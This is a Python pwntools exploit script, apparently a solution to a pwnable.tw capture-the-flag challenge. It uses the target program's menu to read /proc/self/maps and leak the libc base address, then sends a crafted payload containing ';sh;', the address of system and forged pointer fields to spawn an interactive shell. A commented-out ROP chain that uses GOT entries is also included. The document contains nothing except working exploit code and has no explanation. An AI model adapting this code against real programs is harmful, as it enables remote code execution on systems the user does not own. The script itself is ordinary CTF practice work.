from pwn import *
#s = remote('chall.pwnable.tw',10200)
#s = remote('192.168.50.4',1234)
raw_input()
s.recvuntil('choice :')
s.sendline('1')
s.recvuntil('see :')
'''
rop = p32(0x8048A37)
rop += p32(0x8048550) # puts
rop += p32(0x080484d1) # pop ebx ; ret
rop += p32(0x804B024) # puts_got
rop += p32(0x80485C0) # scanf
rop += p32(0x08048b9a) # pop edi ; pop ebp ; ret
rop += p32(0x8048DD9) # %s
rop += p32(0x804B028) # exit_got
rop += p32(0x8048560) # exit
rop += p32(0x080484d1) # pop ebx ; ret
rop += p32(0x804B084) # /bin/sh
'''
s.sendline('/proc/self/maps')
s.recvuntil('choice :')
s.sendline('2')
s.recvuntil('choice :')
s.sendline('2')
s.recvuntil('choice :')
s.sendline('3')
#print util.fiddling.hexdump(s.recvuntil('/lib')[0x19:0x19+8])
libc_base = int(s.recvuntil('/lib')[0x19:0x19+8],16)
log.info("libc_base : %x"%libc_base)
s.recvuntil('choice :')
s.sendline('4')
s.recvuntil('choice :')
s.sendline('1\n')
s.recvuntil('see :')
s.sendline(p32(0))
#system -- 0x40310 / 0x3a940
s.recvuntil('choice :')
s.sendline('5\n')
s.recvuntil('name :')
dat = "AAAA"
dat += ";sh;"
dat += p32(libc_base + 0x3a940)
dat += p32(0x0)*((0x20-len(dat))/4)+p32(0x804b260)
dat += '\x00'*(0x48-len(dat))
dat += p32(0x804B080)
dat += p32(0x804b080)
dat += '\x00'*(0x94-len(dat))
dat += p32(0x804b260)
dat += "\x00"*0x200
s.sendline(dat)
s.interactive()
